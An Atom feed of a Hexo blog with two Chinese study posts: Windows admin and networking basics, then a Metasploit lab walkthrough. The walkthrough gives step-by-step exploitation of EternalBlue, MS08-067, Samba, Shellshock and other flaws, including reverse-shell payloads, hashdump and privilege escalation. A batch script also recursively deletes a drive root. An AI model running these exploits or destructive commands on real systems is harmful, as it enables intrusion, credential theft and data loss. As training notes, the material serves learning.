<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>我是良民</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-05-05T02:35:52.950Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>我是良民</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安全基础学习</title>
    <link href="http://yoursite.com/2020/04/08/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/04/08/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-04-08T13:00:30.205Z</published>
    <updated>2020-05-05T02:35:52.950Z</updated>
    
    <content type="html"><![CDATA[<h2 id="虚拟机设置"><a href="#虚拟机设置" class="headerlink" title="虚拟机设置"></a>虚拟机设置</h2><p>1.使用桥接模式：使用的真实机的网卡，可以连接互联网也可以实现虚拟机和真实机互联，可以将其看作一个真实机，但网段必须与真实机一样。<br>2.NAT模式：虚拟机使用vmnet8这块虚拟网卡，虚拟机可以连接互联网，但是虚拟机只可以访问自己的真实机，但是不能访问其他真实机 （注意由于版本原因导致我安装的xp和win2003不能连接互联网）<br>3.仅主机模式：虚拟机会使用vmnet1这块网卡，虚拟机不能够上网，只能与真实机和虚拟机互访  </p><h2 id="window命令"><a href="#window命令" class="headerlink" title="window命令"></a>window命令</h2><ol><li>cd :直接退到更目录下  </li><li>rd :删除空文件夹  </li><li>rd /s /q:无条件删除空文件夹  /s 表示包括子文件夹也就是目录树，/q表示无需提示，安静模式</li><li>echo 字符串 &gt;&gt; 路径 + 文件名.扩展名 ：将字符串写入到文件夹中，写在最后面  </li><li>echo  字符串 &gt; 路径 + 文件名.扩展名 ：将字符串覆盖原有内容  </li><li>type 文件名.扩展名：浏览该文件</li><li>del 文件名.扩展名 ：删除文件  </li><li>copy con 文件名.扩展名：在控制台输入文字到文件中，回车后开始编辑，按住ctrl + z 结束编辑    </li><li>del <em>.</em> /s /q :删除所有文件 /s表示包括所有空文件夹  </li><li>attrib +h 文件夹  ：隐藏文件夹 h表示hidden  </li><li>attrib -h 文件夹名称 ：取消隐藏文件夹  </li><li>shutdown -s -t 秒:定时关机，-s表示关机 -t表示时间  </li><li>shutdown -s -f -t :表示定时强制关机，有时候12命令不好用的情况下  </li><li>shutdown -r -t 秒:定时重启  </li><li>shutdown -a :取消所有定时  </li><li>shutdown -l:注销  </li><li>copy 原文件路径名 目标文件路径名 ：复制文件  </li><li>./：当前路径名  </li><li>../:上一级路径  </li><li>move  原文件路径名 目标文件路径名：移动文件  </li><li>ren 旧名 新名 ：将文件/文件夹重命名，ren是rename的缩写  </li><li>/P 删除每一个文件之前提示确认。<br>/F 强制删除只读文件。<br>/S 从所有子目录删除指定文件。<br>/Q 安静模式。删除全局通配符时，不要求确认。<br>/A 根据属性选择要删除的文件。<br>attributes R 只读文件 S 系统文件   </li><li>netstat -an：查看所有端口  </li><li>net share ：查看所有共享文件夹列表</li><li>net share 共享名 /del:关闭共享</li></ol><h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><p>批处理文件 文件名.bat<br>里面执行的使dos命令<br>开头写上@echo off 关闭回显及不显示执行过程，只显示执行结果，结尾写上pause防止闪退，&gt;nul &nbsp;2&gt;nul表示屏蔽输出，及不管执行正确与否都不会显示输出</p><p>代码</p><pre><code>@echo off  color 0atitle my titleecho ===========echo the programeecho============pauseecho rubbish is cleaning....E: &gt;nul 2&gt;nul //进入E盘使用 &gt; nul 2&gt;nul是为了防止出现报错信息cd / &gt;nul 2&gt;nulrd ./s/q &gt;nul 2&gt;nulping -n 127.0.0.1 &gt;nul 2&gt;nulecho congratulationpause如果不加&gt;nul 2nul 就会出现如下情况:  the programe请按任意键继续. . .  rubbish is cleaning....  .\$RECYCLE.BIN - 拒绝访问。  .\SYSTEM~1 - 拒绝访问。congratulation  请按任意键继续. . .</code></pre><p>：冒号用来区分区块的,相当于swith语句中的case，使用goto语句可以跳转到区块位置<br>@echo off<br>tile 飞鸽小程序</p><h4 id="小案例"><a href="#小案例" class="headerlink" title="小案例"></a>小案例</h4><pre><code>:menuecho ====================echo     菜单echo 1.定时关机echo 2.取消定时echo 3.推出echo ====================set /p num = 请选择您的选项if &quot;%num%&quot; ==&quot;1&quot; goto 1if &quot;%num%&quot; ==&quot;2&quot; goto 2if &quot;%num%&quot; ==&quot;3&quot; goto 3echo 输入错误goto memu:1set /p a=请输入结束时间:shutdown -s -f -t %a%goto menu:2shutdown -agoto menu:3exit</code></pre><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><p>windows服务器版本win2000，win2003，win2008，win2012<br>Linux服务器：redhat centos<br>每个账户有自己的SID（安全标识符）<br>用户SID：S-…..-500  其中前面表示系统SID，后面500表示管理员的UID为500，普通用户后面接的从1000开始。<br>查看sid值：whoami /user<br>账户密码存储位置：C:\windows\system32\config\SAM,windows系统上，默认密码最长有效期为42天  </p><h4 id="账户"><a href="#账户" class="headerlink" title="账户"></a>账户</h4><ol><li>给人使用的账户<br>administrator #管理员账户<br>guest #来宾账户  </li><li>计算机系统账户<br>system  :系统账户，<font color = red>权限最大</font><br>local services :本地账户=普通用户<br>net services:本地账户= 普通账户  </li></ol><p>账户保存路径（家）<br>win7/win2008 C:\用户\<br>xp/win2003 C:\documents and settings\</p><h4 id="用户命令"><a href="#用户命令" class="headerlink" title="用户命令"></a>用户命令</h4><p>net user ：查看所有用户<br>net user 用户名  密码 ：为用户更改密码<br>net user 用户名 密码 /add ：创建一个新用户<br>net user 用户名 /active:yes/no: 激活或者禁用用户  </p><h2 id="组管理"><a href="#组管理" class="headerlink" title="组管理"></a>组管理</h2><p>作用：将需要赋予一样权限的用户放在一个组中，这样可以方便为该用户赋予权限  </p><h4 id="内置组-权限从高到低排序"><a href="#内置组-权限从高到低排序" class="headerlink" title="内置组 权限从高到低排序####"></a>内置组 权限从高到低排序####</h4><p>administrators :管理员组<br>guests：来宾组<br>uses：用户组<br>network：网络配置组<br>print：打印机组<br>remote desktop：远程桌面组  </p><h4 id="组管理命令"><a href="#组管理命令" class="headerlink" title="组管理命令"></a>组管理命令</h4><p>net localgroup:列出所有组<br>net localgroup 组名：查看该组的所有成员<br>net localgroup 组名 /add:添加该组（后面可以为该组赋予权限）<br>net localgroup 组名 用户名 /add 添加用户到组<br>net localgroup 组名 用户名 /del：删除用户<br>net localgroup 组名 /del：删除组</p><h2 id="服务器远程管理"><a href="#服务器远程管理" class="headerlink" title="服务器远程管理"></a>服务器远程管理</h2><p>可视化实现<br>1，将winxp和win2003连接在同一个局域网中，以保证能ping通<br>2.将服务器的远程桌面开启，我的电脑-&gt;右键属性，远程-&gt;开启远程桌面<br>3.在客户机上win+r输入mstsc，输入ip，输入用户名和密码（注意，如果是普通用户，是无法完成远程登录的，因为没有这个权限，所以，需将该用户放到remote desktop这个组中）<br>命令行实现<br>1.服务器win+r输入services.msc 找到telnet服务将其改为启动并且自动，这样每次开机后就会启动<br>2.在客户机上进入命令行窗口输入telnet +ip,输入账号和密码  ，结果发现telnet仍然关闭，这是因为没有赋予权限，将用户放到TelnetClients这个组中，如果没有就手动添加。</p><h2 id="NTFS权限"><a href="#NTFS权限" class="headerlink" title="NTFS权限"></a>NTFS权限</h2><p><strong>文件系统</strong>：实际上就是格式化后系统重新在磁盘上划分格子的过程<br>常用的文件系统 1.FAT(windows) 2.NTFS(windows) 3.EXT(linux)<br>NTFS特点 提高磁盘读写性能，可靠，磁盘利用率高，支持单个文件大于4G，NTFS应用于文件比较大的磁盘比较合适，而FAT应用于文件比较小的磁盘，否则会比较浪费磁盘资源，以上优点都是FAT不具有的。所以我们在安装系统时通常选择NTFS<br><strong>修改NTFS权限</strong><br>特殊权限：控制文件权限列表的权限<br>当用户同时属于多个组时，权限是累加的，即该用户拥有所属于的所有组的权限<br><strong>拒绝权限最大：</strong>当用户a属于b组，但b组中的文件不想让a看，所以在权限中添加a用户然后权限选择全部拒绝。<br>强制继承：文件夹下的各个子文件夹权限不同，现在需要将子文件夹的权限都改成父文件夹的权限，进行权限同一。解决：文件右键，属性，安全，高级，勾选第二个对号。<br><strong>文件复制对权限的影响：</strong>同一级文件复制后，被复制的文件权限被改变为父级的文件权限，同一级的文件剪切后，被剪切的文件放到文件后权限不变。不是同一级的文件复制或者剪切后出现被复制的文件权限被更改为父级文件夹的权限。<br><strong>隐藏共享文件夹</strong>：如果某个文件夹不想要被别人看见，填写共享名，并且后面加上$符号，例如share$，那么访问者就不会看见该文件夹，如果想要被指定的人访问，则让访问者在后面加上隐藏的文件的名称，例如 \+ip+\share$<br><strong>列出所有共享文件夹</strong>  net share  所有盘符默认共享<br><strong>关闭共享</strong> net share 共享名 /del，但是开机之后仍然默认共享所有盘符 ，如果想要有些东西共享，有些不共享，解决：在删除共享之后，更改注册表将自启动共享关闭，即在注册表中找到 hkey_local_machine\system\currentcontrolset\services\lanmanserver\parameters\右键建立DWORD文件，名称为AutoShareServer,值为0，这样下次开机时就不会默认开启所有共享<br>计算机只作为网页服务器，关闭共享服务，在服务中，将server这个服务关闭即可。这样该计算机就不会提供共享服务。<br><strong>添加共享</strong> net share c: /add  </p><h2 id="PE破解系统"><a href="#PE破解系统" class="headerlink" title="PE破解系统"></a>PE破解系统</h2><p>u深度增强版</p><h2 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h2><p>作用：自动分配ip地址<br>概念：地址池：（包括ip，子网掩码，网关，DNS，租期）<br>原理：<br>1）客户机发送DHCP Discovery广播包，以在服务器上请求ip地址<br>2）多个服务器收到请求，响应DHCP Offer广播包，但是到达客户机的时间是有先后顺序的。<br>3）客户机发送DHCP Request广播包 说是请求包，实际上更准确是选择包，但是在选择之后，需要向服务器进行ip，子网掩码，网关等请求分配，所以用request<br>4）服务器发送DHCP ACK广播包 确定租约，并提供ip，网关等信息。<br><strong>DHCP续约</strong><br>因为分配的ip地址不可能永远给某一个计算机，所以ip地址使用是有期限的，假如租约为24小时，那么在50%时间即12小时后客户机会发送DHCP Request包，与服务器关于ip地址进行续约，如果出现特殊情况，在50%时间时服务器宕机，则在87.5%时间重新发送一下请求包，以请求续约，如果仍无响应，那么就释放ip地址，重新进行分配。<br>（补充）如果使用kali系统一直进行请求分配ip地址，那么总有一天服务器的资源总会有消耗尽的情况，所以这就是DHCP安全，但是像思科，华为等设备分配ip地址时会与客户机的MAC地址进行绑定，所以不会出现DHCP攻击情况，这也就是硬件安全。<br><strong>DHCP部署</strong><br>将win2003作为服务器，也就是地址池，客户机从该服务器中自动获取服务器网段的ip地址。<br> 虚拟机中将服务器和客户机连接到同一个网卡上。例vmnet2-&gt; 点击我的电脑中cd光驱，-&gt;选中安装可选的windows组件-&gt; 找到网络服务，双击打开，找到动态主机配置协议，勾上。-&gt;注意，需要将win2003配置成为静态ip，即设定固定ip。（此时开启了67，68端口），-&gt;在所有程序，管理工具中打开dhcp开始设置作用域，-&gt;右键服务器名称-&gt;新建作用域，-&gt;设置名称和描述-&gt; 设置分配地址范围，通常前面预留出来20个，因为公司可能有其他服务器，后面预留出5个，作为网关，例192.168.0.21-192.168.0.250-&gt;ip地址排除，如果在该范围内某个ip有其他的作用，可以将其排除，-&gt;设置服务器租约期限，即客户机多长时间更换一次ip-&gt;设置dhcp选项，即网关，例与公司网关吻合，-&gt;设置dns服务器，父域不用写，直接写ip地址，即win2003应该访问哪个服务器例114.114.114.114。-&gt;设置wins服务器，不再使用它，直接下一步。-&gt;激活-&gt;客户机winxp查看ip，首先将本地连接停用，再开启，起到更新的作用.失败的原因，客户机默认是连接再vmware默认的服务器上，没有连接在win2003上，所以需要设置。-&gt;在vmwrae上编辑-&gt;修改网络编辑器，-&gt;更改设置，-&gt;设置成自己选择的网卡，-&gt;将使用本地dhcp服务将ip地址分配给虚拟机前面的对号勾掉。即可。<br><strong>释放IP</strong> 命令ipconfig /release<br><strong>重新分配ip</strong> 命令：ipconfig /renew<br>问题：如果服务器想对某个计算机分配固定的ip，针对该计算机例如老板，服务器永远只给她分配固定的ip，怎样解决？首先在客户机端 ipconfig /all 复制mac地址，打开dhcp中，新建保留，设置ip和粘贴mac地址，即可。<br>问题2：如果以上的设置不小心被删除了，可以导入以前的备份文件，前提是有备份文件，也是在dhcp中设置本分，  保存即可。<br>问题3：可为该服务器分配多个作用域，以解决多个部门使用不同的ip地址范围。  </p><h2 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h2><p>DNS：用来解析ip地址的。搭建过程与DHCP一样，只不过是选择DNS即可。<br>DNS的解析过程，和路由器差不多的原理，都是客户机发起请求后，进行DNS服务器查找，域名，然后进行解析。类似路由器之间的查找。<br><img src="D:/ksdler/installDir/blog/img/1.png" alt="avatar"></p><p><strong>手工解析域名：</strong>例如nslookup <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>   </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;虚拟机设置&quot;&gt;&lt;a href=&quot;#虚拟机设置&quot; class=&quot;headerlink&quot; title=&quot;虚拟机设置&quot;&gt;&lt;/a&gt;虚拟机设置&lt;/h2&gt;&lt;p&gt;1.使用桥接模式：使用的真实机的网卡，可以连接互联网也可以实现虚拟机和真实机互联，可以将其看作一个真实机，但网段必须
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>网络安全学习</title>
    <link href="http://yoursite.com/2020/04/06/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/04/06/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-04-06T04:24:31.537Z</published>
    <updated>2020-05-04T03:45:31.580Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MSF学习"><a href="#MSF学习" class="headerlink" title="MSF学习"></a>MSF学习</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>bwapp漏洞环境，首先开启phpstudy依赖于bwapp 保存位置D:\phpStudy\PHPTutorial\WWW\bwapp\bWAPP 访问网址<a href="http://ip:端口/bwapp/bwapp/login.php登录账号bee，登录密码bug">http://ip:端口/bwapp/bwapp/login.php登录账号bee，登录密码bug</a><br>pikachu漏洞环境：启动phpstudy，网址http：//ip+端口/pikachu</p><h3 id="MSF介绍"><a href="#MSF介绍" class="headerlink" title="MSF介绍"></a>MSF介绍</h3><p>全名The Metasploit Framework 即漏洞框架 ，自带攻击工具</p><h3 id="MSF术语"><a href="#MSF术语" class="headerlink" title="MSF术语"></a>MSF术语</h3><ol><li>exploit &emsp;&emsp;&emsp;攻击行为</li><li>payloads&emsp;&emsp;&emsp;攻击载荷即攻击代码</li><li>shellcode&emsp;&emsp;&emsp;溢出代码即攻击载荷运行的攻击机器指令</li><li>module &emsp;&emsp;&emsp;也就是软件代码组件</li><li>listner&emsp;&emsp;&emsp;监听器，攻击时返回给攻击者的信息</li></ol><h3 id="MSF中模块（module）介绍"><a href="#MSF中模块（module）介绍" class="headerlink" title="MSF中模块（module）介绍"></a>MSF中模块（module）介绍</h3><ol><li>Auxiliary&emsp;&emsp;&emsp;主要包括渗透测试中一些辅助性的脚本</li><li>Encoders：&emsp;&emsp;各种编码工具,用于躲过入侵检测和过滤系统</li><li>Exploits：&emsp;&emsp;包括了 exp、0day、各种漏洞使用的脚本</li><li>Nops：&emsp;&emsp; NOP (No Operation or Next Operation) sled,由于 IDS/IPS 会检查数据包中不规则的数据，所以在某些场合下(比如针对溢出攻击),某些特殊的滑行字符串(NOPS x90x90…)则会因为被拦截而导致攻击失效，所以此时需要修改 exploit 中的 NOPs.nops</li><li>Payloads ：&emsp;&emsp;这个单词翻译过来叫载荷：是攻击者发送给系统执行的指令（不包括  exploits  攻击阶段），payloads  主要是在目标机执行的，而 exploits 是在本地机执行作用于目标机。</li><li>Post: &emsp;&emsp;&emsp;&emsp;这个目录里放着 msf 的 exploits 执行成功后，向目标机发送的一些功能性指令比如：提权，获取 hash 等。</li><li>Data： &emsp; &emsp;这个目录里盛放了 Meterpreter、PassiveX、Vnc、DLLs 等这些工具和一些用户接口代码，Msfweb 和一些其他模块用到的数据文件。</li><li>Plugins：&emsp;&emsp;&emsp;这里的模块用户需要使用 load 来加载，提供数据库连接控件， 和各种要用到的控件。</li><li>Scripts：&emsp;&emsp;&emsp;这个目录下的文件大都是Meterpreter 这个模块到用的脚本。比如Meterpreter 里用到的migrate 来转移到其他进程的指令的源代码就在这个目录下。</li><li>Tools：&emsp;&emsp;&emsp;包括一些有用的脚本和零散的工具。</li></ol><h3 id="MSF中的常见命令"><a href="#MSF中的常见命令" class="headerlink" title="MSF中的常见命令"></a>MSF中的常见命令</h3><ol><li>编辑 &emsp;&emsp;&emsp;i</li><li>进入msf控制台&emsp;&emsp;msfconsole</li><li>保存 &emsp;&emsp;&emsp;：w</li><li>保存退出&emsp;：wq</li><li>帮助菜单&emsp;？</li><li>介绍某一个功能 &emsp;? + 某一命令（中间有空格）</li><li>搜索漏洞&ensp;&emsp;search ；例如 search ms08-067&emsp;ms是微软的缩写， 08-067表示08年6月7日，介绍该漏洞属于哪个模块，modules表示模块</li><li>使用某一模块&emsp;&emsp;&emsp;use + 模块名</li><li>查看某一模块的所有信息&emsp;&emsp;&emsp;使用模块后，info即可查看，其中available targets表示该漏洞出现在哪些主机上 其中basic options提供了该漏洞的使用方法需要提供RPOST：被攻击主机名，被攻击主机端口：RPORT</li><li>进入kali中msf的目录&emsp;&emsp;cd metasploit -framework  </li><li>在9的前提下，在目录中查看目录下的文件名称&emsp;&emsp; ls查看所有模块</li><li>返回上一级目录&emsp;&emsp;&emsp; cd..</li><li>show options &emsp;&emsp;&emsp;可提供操作提示，与info差不多  </li><li>back：返回命令  </li><li>set：给一个变量赋值  </li><li>net user：查看当前所有用户  </li><li>net user test test /add：添加用户  </li><li>session -i ：查看攻击后返回的信息  </li><li>ifconfig：linux系统中查看ip地址命令  </li><li>ctrl + H: 打开kali文件夹下的隐藏文件  </li><li>telnet ip+端口 ：扫描计算机的端口</li></ol><h3 id="MSF渗透测试一"><a href="#MSF渗透测试一" class="headerlink" title="MSF渗透测试一"></a>MSF渗透测试一</h3><p>攻击xp系统，注意是sp2chinese版本的  </p><ol><li>msfconsole &emsp;&emsp;&emsp;进入msf  </li><li>search ms08_067  &emsp;&emsp;&emsp;搜索漏洞  </li><li>use exploit/windows/smb/ms08_067_netapi &emsp;&emsp;使用该漏洞  </li><li>show options &emsp;&emsp;&emsp;展示使用方法，看reqiured选项如果是yes是必须设置的，flase则可以不设置   </li><li>set RHOST 192.168.80.128：设置被攻击者的ip  </li><li>info：查看该所有可以被攻击的系统版本 并且在base options中查   </li><li>check：检查该目标主机能够被攻击  </li><li>exploit：使用该命令开始攻击</li></ol><h3 id="MSF渗透测试二"><a href="#MSF渗透测试二" class="headerlink" title="MSF渗透测试二"></a>MSF渗透测试二</h3><p>利用自己创建链接获取控制其他计算机的权限    </p><ol><li>同上  </li><li>同上  search ms10_018  </li><li>同上  </li><li>use exploit/windows/browser/ms10_018_ie_behaviors  </li><li>set SRVHOST:表示设置反弹回来的服务器，即攻击成功后，获取权限后，将权限返回到哪个服务器，这里我们选择kali的ip地址  </li><li>set PAYLOADS windows/meterpreter/bind_tcp  </li><li>show options： 查看payloads的使用方法  </li><li>set LPORT： 设置端口  </li><li>run:  运行后出现url地址，复制，作为一个链接  </li><li>当有计算机点击该链接时，kali后台就会返回successful  </li><li>接下来就可以拿shell了，控制目标计算机  </li><li>sessions：查看返回来的会话，如果有多个电脑被攻击，就返回多个电脑的信息  </li><li>sessions -i 1：查看受控制的第一个电脑  </li><li>shell：拿到权限，进入到xp系统主机目录，可以进行操作<h3 id="MSF渗透测试三"><a href="#MSF渗透测试三" class="headerlink" title="MSF渗透测试三"></a>MSF渗透测试三</h3>使用word文件进行渗透 漏洞名称ms10_087      </li><li>同上  </li><li>search ms10-087</li><li>同上  </li><li>use  exploit/windows/fileformat/ms10_087_rtf_pfragments_bof  </li><li>show options  </li><li>set FILENAME oldboy.rtf：将文件改一个名字，默认为msf.rtf  </li><li>set PAYLOAD windows/exec ：上传一个payload  </li><li>show options：  </li><li>set CMD calc.exe :上传一个计算机程序  </li><li>run：开始生成一个文件  </li><li>找到文件存放路径，将该文件放到win7以上的系统上面进行使用即可</li></ol><h3 id="渗透测试四"><a href="#渗透测试四" class="headerlink" title="渗透测试四"></a>渗透测试四</h3><p>永恒之蓝 ms17-010 即勒索病毒  </p><ol><li>同上  </li><li>search ms-17-010  </li><li>use exploitwindows/smb/ms17-010-eternalblue  </li><li>show options      </li><li>set RHOST win7主机,set LHOST kali主机ip ：配置RHOST 和LHOST     </li><li>set payloads windows/x64/smb/meterpreter/reverse_tcp    </li><li>run：运行攻击    </li><li>拿shell，获取计算机权限。  </li><li>遇到的问题，win7的网络模式需设置为桥接模式，否则在nat模式中是无法连接网络的。<h3 id="渗透测试五"><a href="#渗透测试五" class="headerlink" title="渗透测试五"></a>渗透测试五</h3>linux漏洞  </li><li>进入msf</li><li>search scanner/samba  </li><li>use auxiliary/scanner/smb/smb_version：设置版本  </li><li>set RHOST ip地址  :设置被攻击ip  </li><li>run ：开始运行  </li><li>use expoit/multi/samba/usermap_script  </li><li>set RHOST ip地址：设置被攻击ip  </li><li>exploit ：开始攻击  </li><li>拿shell  </li></ol><h3 id="另一种linux漏洞"><a href="#另一种linux漏洞" class="headerlink" title="另一种linux漏洞"></a>另一种linux漏洞</h3><p>影响了samba3.5以后的版本，不包括4.6.4/4.5.10/4.4.14 </p><ol><li>samba -v：查看samba版本  </li><li>vi /etc/samba/smb.conf：打开目录下这个文件，/表示root根目录下   </li><li>在末行加入  <pre><code> [public]        comment = public       broweseable = yes       writeable = yes       path = /tmp/public       public = yes       read only = no  </code></pre></li><li>mkdir /tmp/public :在linux2017中添加共享目录  </li><li>chmod 777 /tmp/public :修改读写权限  </li><li>/etc/init.d/samba restart :重启samba  </li><li>ps aux |grep samba : 查看samba进程  </li><li>netstat -tnlp samba ：查看端口  </li><li>进入msf，use exploit/linux/samba/is_known_pipename :利用模块  </li><li>set RHOST：设置RHOST  </li><li>run：拿shell    </li><li>check：检查靶机是否存在该漏洞  </li></ol><h3 id="破壳漏洞"><a href="#破壳漏洞" class="headerlink" title="破壳漏洞"></a>破壳漏洞</h3><p>原理: CGI脚本利用了bash命令，由于bash版本较低，攻击者把有害数据写入环境变量，传入服务器端，触发服务器运行bash命令，完成攻击  </p><ol><li>进入到靶机的 usr/lib/cgi-bin目录下，输入sudo nano hello.sh :sudo表示linux系统管理员权限 nano 表示打开某一个文件进行编辑，类似于vim  </li><li>对hello.sh进行编辑,输入echo “Content-type : text/html” echo “hello world”   </li><li>sudo chmod s775 hello.sh:为文件赋予权限  </li><li>攻击机中启动msf，搜索 search shellshock  </li><li>use exploit/multi/apache_mod_cgi_bash-env-exec  </li><li>set Rhost:  </li><li>set targeturi /cgi-bin/hello.sh  </li><li>set payload linux/x86/shell/reverse_tcp  </li><li>check ,exploit<br>攻击失败</li></ol><h3 id="PHP-CGI漏洞"><a href="#PHP-CGI漏洞" class="headerlink" title="PHP CGI漏洞"></a>PHP CGI漏洞</h3><ol><li>进入msf  </li><li>search cve:2012-1823  </li><li>use exploit/multi/http php_cgi_arg_injection</li><li>options  </li><li>set RHOST ip地址  </li><li>run  <h3 id="Java-RMI-SERVER漏洞"><a href="#Java-RMI-SERVER漏洞" class="headerlink" title="Java RMI SERVER漏洞"></a>Java RMI SERVER漏洞</h3></li><li>Java rmi server 的注册表和rmi激活服务的默认配置存在安全漏洞导致代码执行  </li><li>search java_rmi_server  </li><li>use exploit/multi/misc/java_rmi_server  </li><li>set RHOST ip地址  </li><li>run  </li><li>shell  </li></ol><h3 id="java-cve-2013-0422漏洞"><a href="#java-cve-2013-0422漏洞" class="headerlink" title="java cve-2013-0422漏洞"></a>java cve-2013-0422漏洞</h3><ol><li>进入msf  </li><li>search java_jre17_jmxbean  </li><li>use exploit/multi/browser/java_jre17_jmxbean  </li><li>set RHOST ip地址  </li><li>set target  </li><li>set payload linux/x86…..  </li><li>set LHOST  </li><li>run  </li></ol><h3 id="distcc后门漏洞"><a href="#distcc后门漏洞" class="headerlink" title="distcc后门漏洞"></a>distcc后门漏洞</h3><p>distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是xcode1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制    </p><ol><li>进入msf  </li><li>search distcc_exec  </li><li>use expoit/unix/misc/distcc_exec  </li><li>set RHOST  </li><li>run  </li></ol><h3 id="druby命令执行漏洞"><a href="#druby命令执行漏洞" class="headerlink" title="druby命令执行漏洞"></a>druby命令执行漏洞</h3><p>druby配置不当，被滥用执行命令，druby是个编程语言，msf中的工具就是由druby写的，端口8787  </p><ol><li>启动msf  </li><li>search drb_remote_codeexec  </li><li>use exploit/linux/drb_remote_codeexec  </li><li>set RHOST  </li><li>set URL druby://ip地址:8787</li><li></li></ol><h3 id="震网三代"><a href="#震网三代" class="headerlink" title="震网三代"></a>震网三代</h3><p>CVE-2017-8464文件远程代码执行漏洞，当系统在解析快捷方式时，存在远程执行任意代码的高危漏洞<br>CVE-2017-8543windows，window处理内存中的对象，存在搜索远程命令执行漏洞<br>攻击机kali<br>靶机win7  </p><ol><li>进入msf  </li><li>search 2017—8464  </li><li>use exploit/windows/fileformat/cve_2017_8464_lnk_rce  </li><li>set payload windows/meterpreter/reverse_tcp  </li><li>set LOST 攻击机IP  </li><li>exploit  </li><li>会在路径下生成一些文件，将该文件放到win7中  </li><li>开始设置msf监听。  </li><li>在msf下，search multi/handler  </li><li>use exploit/multi/handler  </li><li>set payload windows/meterpreter/reverse_tcp  </li><li>set LHOST ip  </li><li>run  </li></ol><h3 id="flash-0day病毒"><a href="#flash-0day病毒" class="headerlink" title="flash 0day病毒"></a>flash 0day病毒</h3><p>不好用</p><h3 id="MSF辅助模块"><a href="#MSF辅助模块" class="headerlink" title="MSF辅助模块"></a>MSF辅助模块</h3><p>1.Auxiliary模块，情报搜集阶段<br>   可以使用 whois 来进行信息搜集（linux自带whois）例如 whois baidu.com<font color = red>这里不要添加www.</font> 进行域名详细信息查询<br>   ip地址详细信息查询，whois 114.114.114.114<br>   利用辅助模块查找邮箱 use auxiliary/gather/search_email_collector,设置domain也就是域名，<a href="http://www.baidu.com,将Google关掉" target="_blank" rel="noopener">www.baidu.com,将Google关掉</a> set search_google false ,run即可，因为百度中没有存在邮箱，所以搜索为0<br>   或者使用枚举 use auxiliary/gather/enum_dns<br>   set domin baidu.com <font color = red>注意这里域名不要加www.因为枚举模块会自动添加</font>，run即可<br>2.端口扫描模块<br> （1）nmap：namp -sV 192.168….<br> （2）syn扫描：扫描器向目标主机端口发送请求链接的syn包，扫描器收到syn/ack后，不是发送ack应答，而是发送rst包请求断开，这样没有完成三次握手，无法建立连接，因此这种扫描不会被记录到系统日志中，及不会留下痕迹，但是这种扫描需要root权限。<br>使用：use auxiliary/scanner/portscan/syno<br> options -&gt;set RHOSTS ——》set threads(设置线程为100) 100-》run<br>（3）TCP扫描：use auxiliary/scanner/portscan/tcp-&gt;set RHOSTS -&gt;set threads<br>3.服务版本信息检测<br>   1（smb）<br>   服务器消息块（Server Message Block，缩写为SMB），又称网络文件共享系统（Common Internet File System，缩写为CIFS, /ˈsɪfs/），一种应用层网络传输协议，由微软开发，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。它也提供经认证的行程间通信机能。<br>   使用:use auxiliary/scanner/smb/smb_version -&gt;set RHOSTS -&gt;run<br>   2(SSH版本扫描)<br>   SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题<br>   使用:use auxiliray/scanner/ssh/ssh_version ——&gt; set RHOSTS<br>   3(FTP)版本扫描<br>  文件传输协议（File Transfer Protocol，FTP）是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。<br>   使用：use auxiliary/scanner/ftp/ftp_verson -&gt;set RHOSTS -&gt;set threads-&gt;run  </p><h3 id="拿到meterpreter-shell之后，后期攻击方法"><a href="#拿到meterpreter-shell之后，后期攻击方法" class="headerlink" title="拿到meterpreter shell之后，后期攻击方法"></a>拿到meterpreter shell之后，后期攻击方法</h3><p><font color = red>注意，后面的所有方法都是建立在获取了meterpreter shell之后的操作</font></p><ol><li>上传文件到windows主机 命令upload &lt;文件名称&gt; &lt;路径&gt;        </li><li>下载主机上的文件 download <file> &lt;保存路径&gt;<font color = red>注意windows路径要使用双下划//</font>   </li><li>在靶机上执行exe文件 ：execute -f &lt;路径&gt;  </li><li>创建cmd新通道,即在靶机上执行命令提示符 execute -f cmd -c </li><li>显示进程 ： ps  </li><li>获取靶机的cmd shell :shell  </li><li>获取admin权限：getsystem  </li><li>使用hashdump转存所有hash值  </li><li>创建端口转发：meterpreter shell中<font color = red>注意这里需要使用正确的payload获得meterpreter权限</font>可以让攻击系统访问无法直接访问的主机，例如内网。使用 获取到meterpreter之后，使用portfwd add -l 